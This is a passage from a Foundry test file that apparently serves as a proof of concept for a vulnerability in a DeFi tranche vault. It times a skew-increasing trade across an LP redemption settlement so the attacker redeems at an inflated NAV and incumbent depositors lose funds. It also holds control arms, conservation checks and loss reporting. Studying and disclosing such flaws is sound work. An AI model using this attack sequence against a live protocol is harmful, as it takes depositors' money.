        settlementToken.mint(lp, amount);
        _mark();
        vm.startPrank(lp);
        settlementToken.approve(address(v), amount);
        id = v.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    /// @dev Real deposit flow: request, wait for the epoch boundary, unrelated keeper settles, LP claims shares.
    function _lpDeposit(
        TrancheVault v,
        address lp,
        uint256 amount
    ) internal returns (uint256 shares) {
        uint256 id = _requestDeposit(v, lp, amount);
        _warpTo(pool.lpEpochStart(id));
        _routerSettle();
        uint256 claimable = v.claimableDepositRequest(id, lp);
        require(claimable == amount, "deposit not fully activated");
        vm.prank(lp);
        shares = v.claimDeposit(id, claimable, lp, lp);
    }

    function _fund(
        uint256 incA,
        uint256 incB,
        uint256 seniorAmt
    ) internal returns (Scn memory s) {
        if (incA > 0) {
            s.incDep[0] = incA;
            s.incShares[0] = _lpDeposit(juniorVault, incumbentA, incA);
        }
        if (incB > 0) {
            s.incDep[1] = incB;
            s.incShares[1] = _lpDeposit(juniorVault, incumbentB, incB);
        }
        if (seniorAmt == type(uint256).max) {
            // largest Senior deposit the vault accepts at the release 80% cap (queried, not forced)
            // (the cap drifts by a few atoms with the 1 s mark advance inside the request, hence the 1 USDG haircut)
            seniorAmt = seniorVault.maxRequestDeposit(seniorLp) - 1e6;
        }
        if (seniorAmt > 0) {
            s.seniorDep = seniorAmt;
            s.seniorShares = _lpDeposit(seniorVault, seniorLp, seniorAmt);
        }
    }

    // ------------------------------------------------------------------------------------------------ one scenario run

    function _cfg(
        Mode m,
        uint256 cycles,
        uint256 attackerDeposit
    ) internal pure returns (Cfg memory c) {
        c.mode = m;
        c.cycles = cycles;
        c.attackerDeposit = attackerDeposit;
        c.victimsExit = true;
        c.sizeBps = 10_000;
    }

    /// @dev Runs each config from the same snapshot (state is restored after every arm).
    function _arms(
        Scn memory s,
        Cfg[] memory cs
    ) internal returns (Res[] memory rs) {
        rs = new Res[](cs.length);
        for (uint256 i; i < cs.length; ++i) {
            uint256 snap = vm.snapshotState();
            rs[i] = _run(s, cs[i]);
            vm.revertToState(snap);
        }
    }

    function _run(
        Scn memory s,
        Cfg memory c
    ) internal returns (Res memory r) {
        r.cumNet = new int256[](c.cycles);
        r.cycleC = new uint256[](c.cycles);
        r.cycleF = new uint256[](c.cycles);
        uint256 t0 = vm.getBlockTimestamp();
        uint256 treasury0 = _treasuryBal();
        uint256 keeper0 = _wealth(keeper);
        uint256 honestFunded;
        if (c.honestSize > 0) {
            honestFunded = _honestOpen(c, r);
        }
        for (uint256 i; i < c.cycles; ++i) {
            _cycle(c, r, i);
        }
        if (c.honestSize > 0) {
            _honestClose(r, honestFunded);
        }
        r.elapsed = vm.getBlockTimestamp() - t0;
        r.treasuryDelta = _treasuryBal() - treasury0;
        r.keeperDelta = int256(_wealth(keeper)) - int256(keeper0);
        r.attackerNet = r.cumNet[c.cycles - 1];
        if (c.victimsExit) {
            _victimsExit(s, r);
        }
    }

    /// @dev An unrelated honest trader opens a same-side (LONG) position first. It stays open through the whole LP cycle
    ///      and is closed after the attacker is done, in the control and in the attack arm alike.
    function _honestOpen(
        Cfg memory c,
        Res memory r
    ) internal returns (uint256 funded) {
        _mark();
        r.honestNotional = c.honestSize / 1e12;
        uint256 hm = r.honestNotional * 250 / 10_000;
        funded = hm + hm / 5;
        _fundTrader(honestTrader, funded);
        _trade(honestTrader, CfdTypes.Side.LONG, c.honestSize, hm, false);
    }

    function _honestClose(
        Res memory r,
        uint256 funded
    ) internal {
        _mark();
        (uint256 sz,,,,,,) = engine.positions(honestTrader);
        _trade(honestTrader, CfdTypes.Side.LONG, sz, 0, true);
        r.honestPnl = int256(_wealth(honestTrader)) - int256(funded);
    }

    function _cycle(
        Cfg memory c,
        Res memory r,
        uint256 idx
    ) internal {
        uint256 shares = _lpDeposit(juniorVault, attacker, c.attackerDeposit); // fair NAV, no position open
        r.minted += c.attackerDeposit;

        _advance(1 hours + 1); // deposit cooldown
        _mark();
        vm.prank(attacker);
        uint256 redId = juniorVault.requestRedeem(shares, attacker, attacker);
        uint256 boundary = pool.lpEpochStart(redId);

        uint256 thirdId;
        if (c.thirdDeposit > 0) {
            thirdId = _requestDeposit(juniorVault, thirdDepositor, c.thirdDeposit);
            require(pool.lpEpochStart(thirdId) == boundary, "third deposit must mature with the redemption");
        }

        uint256 size;
        uint256 chBefore;
        if (c.mode != Mode.NoTrade) {
            (size, chBefore) = _openLeg(c, r, idx, boundary);
            if (c.mode == Mode.CloseBeforeSettle) {
                if (idx == 0) {
                    r.depthClose = pool.totalAssets();
                }
                _trade(attacker, CfdTypes.Side.LONG, size, 0, true);
                if (idx == 0) {
                    r.traderLegPnl = int256(clearinghouse.balanceAssets(attacker)) - int256(chBefore);
                }
            }
        }

        _warpTo(boundary + 5);
        r.cycleF[idx] = shares * 1e18 / juniorVault.totalSupply();
        if (idx == 0) {
            r.fWad = r.cycleF[0];
        }
        _routerSettle(); // unrelated keeper settles; the matured redemption is priced here

        if (c.thirdDeposit > 0) {
            uint256 cl = juniorVault.claimableDepositRequest(thirdId, thirdDepositor);
            vm.prank(thirdDepositor);
            r.depositorShares = juniorVault.claimDeposit(thirdId, cl, thirdDepositor, thirdDepositor);
        }
        if (c.mode == Mode.Attack) {
            _closeLeg(c, r, idx, size, chBefore);
        }
        _claimAttacker(r, redId, shares, boundary);
        r.cumNet[idx] = int256(_wealth(attacker) + r.stuckValue) - int256(r.minted);
    }

    /// @dev Open a max-skew LONG 60 s BEFORE the redemption boundary so it is open when the keeper settles.
    function _openLeg(
        Cfg memory c,
        Res memory r,
        uint256 idx,
        uint256 boundary
    ) internal returns (uint256 size, uint256 chBefore) {
        _warpTo(boundary - 60);
        _markNow();
        uint256 depth = pool.totalAssets();
        size = (_maxSize(depth) - c.honestSize) * c.sizeBps / 10_000 / LOT * LOT; // total skew (honest + attacker) <= cap
        uint256 notional = size / 1e12;
        uint256 margin = notional * 250 / 10_000;
        _fundTrader(attacker, margin + margin / 5);
        r.minted += margin + margin / 5;
        chBefore = clearinghouse.balanceAssets(attacker);
        uint256 tr0 = _treasuryBal();
        _trade(attacker, CfdTypes.Side.LONG, size, margin, false);
        (,,,,,, int256 vpi) = engine.positions(attacker);
        require(vpi > 0, "skew-increasing open must pay positive VPI");
        r.cycleC[idx] = uint256(vpi);
        if (idx == 0) {
            r.depthOpen = depth;
            r.notional = notional;
            r.vpiC = uint256(vpi);
            r.treasuryOpenDelta = _treasuryBal() - tr0;
        }
    }

    function _closeLeg(
        Cfg memory c,
        Res memory r,
        uint256 idx,
        uint256 size,
        uint256 chBefore
    ) internal {
        uint256 honestSize;
        if (c.honestShortDiv > 0) {
            honestSize = (size / c.honestShortDiv) / LOT * LOT;
            uint256 hm = (honestSize / 1e12) * 250 / 10_000;
            _fundTrader(honestTrader, hm + hm / 5);
            _trade(honestTrader, CfdTypes.Side.SHORT, honestSize, hm, false);
            (,,,,,, int256 hv) = engine.positions(honestTrader);
            r.honestVpi = hv;
        }
        (uint256 sz,,,,,,) = engine.positions(attacker);
        if (c.closePrice != 0) {
            price = c.closePrice;
        }
        if (idx == 0) {
            r.depthClose = pool.totalAssets();
            ICfdEngineTypes.ClosePreview memory pv = engineLens.previewClose(attacker, sz, price);
            r.pvVpiDelta = pv.vpiDeltaAssets;
            r.pvFee = pv.executionFeeAssets;
            r.tmpTreasury = _treasuryBal();
            r.tmpCh = clearinghouse.balanceAssets(attacker);
            r.tmpCash = settlementToken.balanceOf(address(pool));
        }
        _trade(attacker, CfdTypes.Side.LONG, sz, 0, true);
        price = P0;
        if (idx == 0) {
            r.treasuryCloseDelta = _treasuryBal() - r.tmpTreasury;
            r.traderCloseDelta = int256(clearinghouse.balanceAssets(attacker)) - int256(r.tmpCh);
            r.poolCashCloseDelta = int256(settlementToken.balanceOf(address(pool))) - int256(r.tmpCash);
            r.traderLegPnl = int256(clearinghouse.balanceAssets(attacker)) - int256(chBefore);
        }
        if (honestSize > 0) {
            _mark();
            _trade(honestTrader, CfdTypes.Side.SHORT, honestSize, 0, true);
        }
    }

    function _claimAttacker(
        Res memory r,
        uint256 redId,
        uint256 shares,
        uint256 boundary
    ) internal {
        uint256 claimShares = juniorVault.claimableRedeemRequest(redId, attacker);
        uint256 got;
        if (claimShares > 0) {
            vm.prank(attacker);
            got = juniorVault.claimRedeem(redId, claimShares, attacker, attacker);
        }
        uint256 claimed = claimShares;
        // Any remainder (Junior ratio covenant backlog) is funded at later epochs, after the close.
        for (uint256 k = 1; claimed < shares && k <= 3; ++k) {
            _warpTo(boundary + k * 1 hours + 5);
            bytes[] memory d = _ticks(vm.getBlockTimestamp());
            vm.prank(keeper);
            try router.settleLpEpoch(d) {} catch {}
            uint256 more = juniorVault.claimableRedeemRequest(redId, attacker);
            if (more > 0) {
                vm.prank(attacker);
                got += juniorVault.claimRedeem(redId, more, attacker, attacker);
                claimed += more;
            }
        }
        r.redeemAssets = got;
        r.stuckShares = 0;
        r.stuckValue = 0;
        if (claimed < shares) {
            _mark();
            r.stuckShares = shares - claimed;
            r.stuckValue = juniorVault.convertToAssets(r.stuckShares);
        }
    }

    /// @dev Victims realize ONLY through requestRedeem -> keeper settle -> claimRedeem, in a position-free epoch.
    function _victimsExit(
        Scn memory s,
        Res memory r
    ) internal {
        _advance(1 hours + 1);
        _mark();
        uint256 startAt;
        uint256[2] memory ids;
        uint256 seniorId;
        uint256 depId;
        for (uint256 i; i < 2; ++i) {
            if (s.incShares[i] == 0) continue;
            vm.prank(_inc(i));
            ids[i] = juniorVault.requestRedeem(s.incShares[i], _inc(i), _inc(i));
            startAt = _max(startAt, pool.lpEpochStart(ids[i]));
        }
        if (s.seniorShares > 0) {
            vm.prank(seniorLp);
            seniorId = seniorVault.requestRedeem(s.seniorShares, seniorLp, seniorLp);
            startAt = _max(startAt, pool.lpEpochStart(seniorId));
        }
        if (r.depositorShares > 0) {
            vm.prank(thirdDepositor);
            depId = juniorVault.requestRedeem(r.depositorShares, thirdDepositor, thirdDepositor);
            startAt = _max(startAt, pool.lpEpochStart(depId));
        }
        _warpTo(startAt + 5);
        _routerSettle();

        for (uint256 i; i < 2; ++i) {
            if (s.incShares[i] == 0) continue;
            require(juniorVault.claimableRedeemRequest(ids[i], _inc(i)) == s.incShares[i], "incumbent exit must be fully funded");
            r.incWalletBefore[i] = settlementToken.balanceOf(_inc(i));
            vm.prank(_inc(i));
            r.incRealized[i] = juniorVault.claimRedeem(ids[i], s.incShares[i], _inc(i), _inc(i));
            r.incWalletAfter[i] = settlementToken.balanceOf(_inc(i));
            require(r.incWalletAfter[i] - r.incWalletBefore[i] == r.incRealized[i], "wallet delta == claim");
        }
        if (s.seniorShares > 0) {
            require(seniorVault.claimableRedeemRequest(seniorId, seniorLp) == s.seniorShares, "senior exit must be fully funded");
            vm.prank(seniorLp);
            r.seniorRealized = seniorVault.claimRedeem(seniorId, s.seniorShares, seniorLp, seniorLp);
        }
        if (r.depositorShares > 0) {
            require(juniorVault.claimableRedeemRequest(depId, thirdDepositor) == r.depositorShares, "depositor exit must be funded");
            vm.prank(thirdDepositor);
            r.depositorRealized = juniorVault.claimRedeem(depId, r.depositorShares, thirdDepositor, thirdDepositor);
        }
        r.seedJ = juniorVault.convertToAssets(juniorVault.balanceOf(address(this)));
        r.seedS = seniorVault.convertToAssets(seniorVault.balanceOf(address(this)));
    }

    function _max(
        uint256 a,
        uint256 b
    ) internal pure returns (uint256) {
        return a > b ? a : b;
    }

    // ------------------------------------------------------------------------------------------------ reporting

    function _usdg(
        uint256 a
    ) internal pure returns (string memory) {
        string memory frac = vm.toString(a % 1e6);
        while (bytes(frac).length < 6) {
            frac = string.concat("0", frac);
        }
        return string.concat(vm.toString(a / 1e6), ".", frac);
    }

    function _susdg(
        int256 a
    ) internal pure returns (string memory) {
        if (a < 0) {
            return string.concat("-", _usdg(uint256(-a)));
        }
        return _usdg(uint256(a));
    }

    function _f4(
        uint256 fWad
    ) internal pure returns (string memory) {
        uint256 x = fWad / 1e14;
        string memory frac = vm.toString(x % 10_000);
        while (bytes(frac).length < 4) {
            frac = string.concat("0", frac);
        }
        return string.concat(vm.toString(x / 10_000), ".", frac);
    }

    function _incTotal(
        Res memory r
    ) internal pure returns (uint256) {
        return r.incRealized[0] + r.incRealized[1];
    }

    function _incDepTotal(
        Scn memory s
    ) internal pure returns (uint256) {
        return s.incDep[0] + s.incDep[1];
    }

    function _kv(
        string memory sc,
        string memory k,
        string memory v
    ) internal pure {
        console2.log(string.concat("SUMMARY|", sc, "|", k, "=", v));
    }

    function _printArm(
        string memory tag,
        Scn memory s,
        Res memory r
    ) internal pure {
        console2.log(string.concat("---- ARM: ", tag));
        console2.log(string.concat("[", tag, "] f (attacker share of Junior supply) = ", _f4(r.fWad)));
        console2.log(string.concat("[", tag, "] c (open VPI charge) USDG = ", _usdg(r.vpiC), " ; notional USDG = ", _usdg(r.notional)));
        console2.log(string.concat("[", tag, "] pool depth at open USDG = ", _usdg(r.depthOpen), " ; depth at close USDG = ", _usdg(r.depthClose)));
        console2.log(string.concat("[", tag, "] attacker capital in (minted) USDG = ", _usdg(r.minted), " ; cycles = ", vm.toString(r.cumNet.length)));
        console2.log(string.concat("[", tag, "] attacker redemption payout (last cycle) USDG = ", _usdg(r.redeemAssets)));
        console2.log(string.concat("[", tag, "] attacker NET PnL USDG = ", _susdg(r.attackerNet), " ; stuck shares valued = ", _usdg(r.stuckValue)));
        console2.log(string.concat("[", tag, "] trader leg PnL (first cycle, clearinghouse delta) USDG = ", _susdg(r.traderLegPnl)));
        console2.log(string.concat("[", tag, "] treasury USDG delta = ", _usdg(r.treasuryDelta), " ; keeper wealth delta = ", _susdg(r.keeperDelta)));
        for (uint256 i; i < 2; ++i) {
            if (s.incDep[i] == 0) continue;
            string memory who = _incName(i);
            console2.log(
                string.concat(
                    "[", tag, "] ", who, " deposited USDG = ", _usdg(s.incDep[i]), " ; wallet before exit = ",
                    _usdg(r.incWalletBefore[i]), " ; wallet after exit = ", _usdg(r.incWalletAfter[i])
                )
            );
        }
        if (s.seniorDep > 0) {
            console2.log(string.concat("[", tag, "] seniorLp deposited = ", _usdg(s.seniorDep), " ; realized = ", _usdg(r.seniorRealized)));
        }
        if (r.depositorShares > 0) {
            console2.log(string.concat("[", tag, "] thirdDepositor shares minted (1e6 units) = ", vm.toString(r.depositorShares), " ; realized USDG = ", _usdg(r.depositorRealized)));
        }
    }

    /// @dev Conservation: attacker + treasury + keeper + every victim + seed holders, arm minus control, must net to ~0.
    function _sumDelta(
        Res memory ctrl,
        Res memory arm
    ) internal pure returns (int256) {
        return (arm.attackerNet - ctrl.attackerNet) + int256(arm.treasuryDelta) - int256(ctrl.treasuryDelta)
            + (arm.keeperDelta - ctrl.keeperDelta) + int256(_incTotal(arm)) - int256(_incTotal(ctrl))
            + int256(arm.depositorRealized) - int256(ctrl.depositorRealized) + int256(arm.seniorRealized)
            - int256(ctrl.seniorRealized) + int256(arm.seedJ) - int256(ctrl.seedJ) + int256(arm.seedS) - int256(ctrl.seedS)
            + (arm.honestPnl - ctrl.honestPnl);
    }

    function _printCompare(
        string memory sc,
        Scn memory s,
        Res memory ctrl,
        Res memory arm
    ) internal pure {
        uint256 incDep = _incDepTotal(s);
        int256 lossVsCtrl = int256(_incTotal(ctrl)) - int256(_incTotal(arm));
        int256 absLoss = int256(incDep) - int256(_incTotal(arm));
        uint256 fc = arm.fWad * arm.vpiC / 1e18;
        console2.log(string.concat("==== COMPARE ", sc));
        console2.log(string.concat("[", sc, "] f = ", _f4(arm.fWad), " ; c USDG = ", _usdg(arm.vpiC), " ; f*c USDG = ", _usdg(fc)));
        console2.log(string.concat("[", sc, "] incumbents deposited USDG = ", _usdg(incDep)));
        console2.log(string.concat("[", sc, "] incumbents realized (control) USDG = ", _usdg(_incTotal(ctrl))));
        console2.log(string.concat("[", sc, "] incumbents realized (attack)  USDG = ", _usdg(_incTotal(arm))));
        console2.log(string.concat("[", sc, "] LOSS VS CONTROL USDG = ", _susdg(lossVsCtrl)));
        console2.log(string.concat("[", sc, "] ABSOLUTE LOSS VS DEPOSIT (attack) USDG = ", _susdg(absLoss)));
        console2.log(string.concat("[", sc, "] control drift vs deposit (Senior coupon etc.) USDG = ", _susdg(int256(incDep) - int256(_incTotal(ctrl)))));
        console2.log(string.concat("[", sc, "] attacker NET (attack) USDG = ", _susdg(arm.attackerNet), " ; attacker NET (control) USDG = ", _susdg(ctrl.attackerNet)));
        console2.log(string.concat("[", sc, "] attacker net delta vs control USDG = ", _susdg(arm.attackerNet - ctrl.attackerNet)));
        console2.log(string.concat("[", sc, "] redemption uplift vs control USDG = ", _susdg(int256(arm.redeemAssets) - int256(ctrl.redeemAssets))));
        console2.log(string.concat("[", sc, "] conservation residual (should be ~0) USDG = ", _susdg(_sumDelta(ctrl, arm))));
        _kv(sc, "f", _f4(arm.fWad));
        _kv(sc, "c_usdg", _usdg(arm.vpiC));
        _kv(sc, "fc_usdg", _usdg(fc));
        _kv(sc, "depth_at_open_usdg", _usdg(arm.depthOpen));
        _kv(sc, "incumbents_deposited_usdg", _usdg(incDep));
        _kv(sc, "incumbents_realized_control_usdg", _usdg(_incTotal(ctrl)));
        _kv(sc, "incumbents_realized_attack_usdg", _usdg(_incTotal(arm)));
        _kv(sc, "loss_vs_control_usdg", _susdg(lossVsCtrl));
        _kv(sc, "absolute_loss_vs_deposit_usdg", _susdg(absLoss));
        _kv(sc, "attacker_net_attack_usdg", _susdg(arm.attackerNet));
        _kv(sc, "attacker_net_control_usdg", _susdg(ctrl.attackerNet));
        _kv(sc, "treasury_delta_attack_usdg", _usdg(arm.treasuryDelta));
        _kv(sc, "conservation_residual_usdg", _susdg(_sumDelta(ctrl, arm)));
    }

    /// @dev Helper: linear interpolation of the zero crossing, in centi-basis-points of adverse move.
    function _breakEvenCbp(
        int256[5] memory net
    ) internal pure returns (uint256) {
        for (uint256 i; i < 3; ++i) {
            if (net[i] > 0 && net[i + 1] <= 0) {
                return i * 200 + uint256(net[i] * 200 / (net[i] - net[i + 1]));
            }
        }
        return 0;
    }

    function _cbp(
        uint256 cbp
    ) internal pure returns (string memory) {
        string memory frac = vm.toString(cbp % 100);
        while (bytes(frac).length < 2) {
            frac = string.concat("0", frac);
        }
        return string.concat(vm.toString(cbp / 100), ".", frac);
    }

    /// @dev Mirrors the engine curve value k * s^2 / (2 D) in 6-dec assets.
    function _skewCost(
        uint256 skewAssets,
        uint256 depthAssets
    ) internal pure returns (uint256) {
        uint256 skewWad = skewAssets * 1e12;
        return (VPI_FACTOR * (skewWad * skewWad / (depthAssets * 1e12)) / 1e18 / 2) / 1e12;
    }

    function _commonAttackAsserts(
        Scn memory s,
        Res memory ctrl,
        Res memory atk
    ) internal pure {
        assertGt(atk.vpiC, 0, "open must pay positive VPI c");
        assertEq(atk.stuckShares, 0, "attacker redemption fully funded");
        for (uint256 i; i < 2; ++i) {
            if (s.incDep[i] == 0) continue;
            assertLt(atk.incRealized[i], s.incDep[i], "ABSOLUTE: unprivileged incumbent realized < its own deposit");
            assertLt(atk.incRealized[i], ctrl.incRealized[i], "incumbent realized < no-trade control");
        }
        assertGt(atk.attackerNet, 0, "attacker net > 0");
        assertGt(atk.attackerNet, ctrl.attackerNet, "attacker net above control");
    }

    // ================================================================================================ TESTS

    /// @dev Main exploit, about 1M incumbent vs 1M attacker Junior (f ~ 0.5), Junior-only pool.
    function test_Attack_UnprivilegedIncumbent_AbsoluteLoss() public {
        Scn memory s = _fund(1_000_000e6, 0, 0);
        Cfg[] memory cs = new Cfg[](2);
        cs[0] = _cfg(Mode.NoTrade, 1, 1_000_000e6);
        cs[1] = _cfg(Mode.Attack, 1, 1_000_000e6);
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory atk = rs[1];
        _printArm("MAIN control", s, ctrl);
        _printArm("MAIN attack", s, atk);
        _printCompare("MAIN_f050", s, ctrl, atk);

        _commonAttackAsserts(s, ctrl, atk);
        assertGe(atk.fWad, 0.49e18, "f ~ 0.5");
        assertLe(atk.fWad, 0.51e18, "f ~ 0.5");
        // ABSOLUTE loss (unprivileged EOA incumbent ends below the USDG it deposited)
        assertLt(atk.incRealized[0], s.incDep[0], "incRealized < incDeposited");
        // the no-trade control leaves the incumbent whole to rounding (so the loss is caused by the attack)
        assertApproxEqAbs(ctrl.incRealized[0], s.incDep[0], 1e6, "control incumbent whole within 1 USDG");
        assertLe(ctrl.attackerNet, 0, "control: LP round trip alone does not profit");
        assertEq(ctrl.treasuryDelta, 0, "control: no fees");
        // mechanism: redemption priced with c inside Junior NAV, uplift = f*c
        assertApproxEqRel(atk.redeemAssets - ctrl.redeemAssets, atk.fWad * atk.vpiC / 1e18, 0.03e18, "uplift == f*c");
        // the trader leg gets its own VPI back (loss only ~ fees), so the attacker keeps f*c
        assertLt(-atk.traderLegPnl, int256(atk.vpiC / 2), "close refunds the open VPI charge");
        // value conservation: nothing is created, attacker + treasury + keeper gain = victims lose
        assertApproxEqAbs(_sumDelta(ctrl, atk), 0, 2e6, "conservation within 2 USDG");
    }

    /// @dev Negative control 1: identical LP flows, no trade.
    function test_Control_NoTrade() public {
        Scn memory s = _fund(1_000_000e6, 0, 0);
        Cfg[] memory cs = new Cfg[](1);
        cs[0] = _cfg(Mode.NoTrade, 1, 1_000_000e6);
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        _printArm("CONTROL no-trade", s, ctrl);
        console2.log(string.concat("[CONTROL] incumbent loss vs its deposit USDG = ", _susdg(int256(s.incDep[0]) - int256(ctrl.incRealized[0]))));
        _kv("CONTROL_NoTrade", "incumbent_deposited_usdg", _usdg(s.incDep[0]));
        _kv("CONTROL_NoTrade", "incumbent_realized_usdg", _usdg(ctrl.incRealized[0]));
        _kv("CONTROL_NoTrade", "attacker_net_usdg", _susdg(ctrl.attackerNet));
        assertApproxEqAbs(ctrl.incRealized[0], s.incDep[0], 1e6, "no trade: incumbent whole within 1 USDG");
        assertLe(ctrl.attackerNet, 0, "no trade: LP round trip does not profit");
        assertGe(ctrl.attackerNet, -1e6, "no trade: round-trip rounding only");
        assertEq(ctrl.treasuryDelta, 0, "no trade: no fees");
        assertEq(ctrl.vpiC, 0, "no trade: no VPI");
    }

    /// @dev Negative control 2: the SAME open (same state, same c) but the position is closed BEFORE the settlement.
    function test_NegControl_SameTradesClosedBeforeSettlement() public {
        Scn memory s = _fund(1_000_000e6, 0, 0);
        Cfg[] memory cs = new Cfg[](3);
        cs[0] = _cfg(Mode.NoTrade, 1, 1_000_000e6);
        cs[1] = _cfg(Mode.CloseBeforeSettle, 1, 1_000_000e6);
        cs[2] = _cfg(Mode.Attack, 1, 1_000_000e6);
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory neg = rs[1];
        Res memory atk = rs[2];
        _printArm("NEG control (no trade)", s, ctrl);
        _printArm("NEG closed-before-settlement", s, neg);
        _printArm("NEG attack (closed after settlement)", s, atk);
        _printCompare("NEG_closed_before_settle", s, ctrl, neg);
        _printCompare("NEG_vs_attack_reference", s, ctrl, atk);

        assertEq(neg.vpiC, atk.vpiC, "same trade, same c");
        assertLt(neg.attackerNet, 0, "closed before settlement: attacker loses the fees");
        assertGe(neg.incRealized[0], ctrl.incRealized[0], "closed before settlement: incumbent not harmed");
        assertLt(int256(neg.redeemAssets) - int256(ctrl.redeemAssets), int256(neg.fWad * neg.vpiC / 1e18 / 4), "no f*c uplift");
        // the only difference between the two arms is whether the position is open at settlement
        assertGt(atk.attackerNet, 0, "closed after settlement: attacker profits");
        assertLt(atk.incRealized[0], neg.incRealized[0], "incumbent worse off than with the same trades closed pre-settlement");
        assertLt(atk.incRealized[0], s.incDep[0], "ABSOLUTE loss only in the attack arm");
    }

    /// @dev Adverse close-price move (only the attacker's close is moved; it is no longer an LP then).
    function test_PriceSensitivity() public {
        Scn memory s = _fund(1_000_000e6, 0, 0);
        uint64[2] memory confs = [uint64(0), uint64(1e4)];
        uint256[2] memory be;
        for (uint256 k; k < 2; ++k) {
            confE8 = confs[k];
            int256[5] memory moveBp = [int256(0), 2, 4, 6, -2];
            Cfg[] memory cs = new Cfg[](5);
            for (uint256 j; j < 5; ++j) {
                cs[j] = _cfg(Mode.Attack, 1, 1_500_000e6);
                cs[j].victimsExit = false;
                cs[j].closePrice = j == 0 ? 0 : uint256(int256(P0) + moveBp[j] * 1e4);
            }
            Res[] memory rs = _arms(s, cs);
            int256[5] memory net;
            string memory label = string.concat("PRICE_conf", vm.toString(uint256(confs[k])));
            for (uint256 j; j < 5; ++j) {
                net[j] = rs[j].attackerNet;
                string memory mv = j == 4 ? string.concat("-2bp favorable") : string.concat("+", vm.toString(uint256(moveBp[j])), "bp adverse");
                console2.log(string.concat("[", label, "] close move ", mv, " : attacker NET USDG = ", _susdg(net[j])));
                _kv(label, string.concat("net_usdg_move_", mv), _susdg(net[j]));
            }
            be[k] = _breakEvenCbp(net);
            console2.log(string.concat("[", label, "] f = ", _f4(rs[0].fWad), " ; c USDG = ", _usdg(rs[0].vpiC), " ; notional USDG = ", _usdg(rs[0].notional)));
            console2.log(string.concat("[", label, "] BREAK-EVEN adverse move (bp) = ", _cbp(be[k])));
            _kv(label, "f", _f4(rs[0].fWad));
            _kv(label, "c_usdg", _usdg(rs[0].vpiC));
            _kv(label, "break_even_adverse_bp", _cbp(be[k]));
            assertGt(net[0], 0, "flat: profitable");
            assertGt(net[1], 0, "survives +2 bp adverse");
            assertLt(net[3], 0, "+6 bp adverse exceeds the edge");
            assertGt(net[4], net[0], "favorable move adds");
            assertGt(be[k], 300, "break-even above 3 bp");
            assertLt(be[k], 500, "break-even below 5 bp");
        }
        assertLt(be[1], be[0], "oracle confidence lowers the edge but does not remove it");
    }

    /// @dev Depth-neutral: a same-size third-party deposit keeps depth constant, so the clamp does not bind and
    ///      depth reduction is not the mechanism. The concurrent depositor is a second victim.
    function test_DepthNeutral_DepositorOverpays() public {
        Scn memory s = _fund(1_000_000e6, 0, 0);
        Cfg[] memory cs = new Cfg[](2);
        cs[0] = _cfg(Mode.NoTrade, 1, 1_500_000e6);
        cs[1] = _cfg(Mode.Attack, 1, 1_500_000e6);
        cs[0].thirdDeposit = 1_500_000e6;
        cs[1].thirdDeposit = 1_500_000e6;
        Res[] memory rs = _arms(s, cs);
        Res memory ctrl = rs[0];
        Res memory atk = rs[1];
        _printArm("DEPTH_NEUTRAL control (no trade, same third-party deposit)", s, ctrl);
        _printArm("DEPTH_NEUTRAL attack (depth-neutral)", s, atk);
        _printCompare("DEPTH_NEUTRAL", s, ctrl, atk);

        uint256 curveAtClose = _skewCost(atk.notional, atk.depthClose);
        console2.log(string.concat("[DEPTH_NEUTRAL] unclamped close curve value at close depth USDG = ", _usdg(curveAtClose), " ; open charge c = ", _usdg(atk.vpiC)));
        console2.log(string.concat("[DEPTH_NEUTRAL] depositor shares minted control = ", vm.toString(ctrl.depositorShares), " ; attack = ", vm.toString(atk.depositorShares)));
        console2.log(string.concat("[DEPTH_NEUTRAL] depositor deposited USDG = ", _usdg(1_500_000e6), " ; realized control = ", _usdg(ctrl.depositorRealized), " ; realized attack = ", _usdg(atk.depositorRealized)));
        console2.log(string.concat("[DEPTH_NEUTRAL] depositor LOSS VS CONTROL USDG = ", _susdg(int256(ctrl.depositorRealized) - int256(atk.depositorRealized))));
        _kv("DEPTH_NEUTRAL", "depth_close_over_open_ratio_bps", vm.toString(atk.depthClose * 10_000 / atk.depthOpen));
        _kv("DEPTH_NEUTRAL", "curve_at_close_usdg", _usdg(curveAtClose));
        _kv("DEPTH_NEUTRAL", "depositor_deposited_usdg", _usdg(1_500_000e6));
        _kv("DEPTH_NEUTRAL", "depositor_realized_control_usdg", _usdg(ctrl.depositorRealized));
        _kv("DEPTH_NEUTRAL", "depositor_realized_attack_usdg", _usdg(atk.depositorRealized));
        _kv("DEPTH_NEUTRAL", "depositor_loss_vs_control_usdg", _susdg(int256(ctrl.depositorRealized) - int256(atk.depositorRealized)));

        assertApproxEqRel(atk.depthClose, atk.depthOpen, 0.01e18, "depth at close ~= depth at open");
        assertApproxEqRel(curveAtClose, atk.vpiC, 0.01e18, "close curve rebate ~= open charge without the clamp");
        assertApproxEqRel(atk.redeemAssets - ctrl.redeemAssets, atk.fWad * atk.vpiC / 1e18, 0.03e18, "uplift == f*c");
        assertGt(atk.attackerNet, 0, "profitable with no depth reduction");
        assertLt(atk.depositorShares, ctrl.depositorShares, "concurrent depositor minted fewer shares (bought at the inflated NAV)");
        assertLt(atk.depositorRealized, ctrl.depositorRealized, "depositor realizes less than control");
        assertLt(atk.depositorRealized, 1_500_000e6, "depositor ABSOLUTE loss");
        // Disclosed outcome of this arm: the concurrent entrant overpays, which more than offsets the incumbent's pro-rata
        // share of the extraction, so the incumbent ends ABOVE control here and the entrant is the victim. The loss
        // lands on the Junior holders as a group (incumbent + entrant), which ends below what it deposited.
        uint256 grpDep = s.incDep[0] + 1_500_000e6;
        uint256 grpAtk = atk.incRealized[0] + atk.depositorRealized;
        uint256 grpCtrl = ctrl.incRealized[0] + ctrl.depositorRealized;
        console2.log(string.concat("[DEPTH_NEUTRAL] incumbent realized vs control USDG = ", _susdg(int256(atk.incRealized[0]) - int256(ctrl.incRealized[0])), " (positive: the incumbent is NOT the victim in this arm)"));
        console2.log(string.concat("[DEPTH_NEUTRAL] GROUP (incumbent + entrant) deposited = ", _usdg(grpDep), " ; realized attack = ", _usdg(grpAtk), " ; realized control = ", _usdg(grpCtrl)));
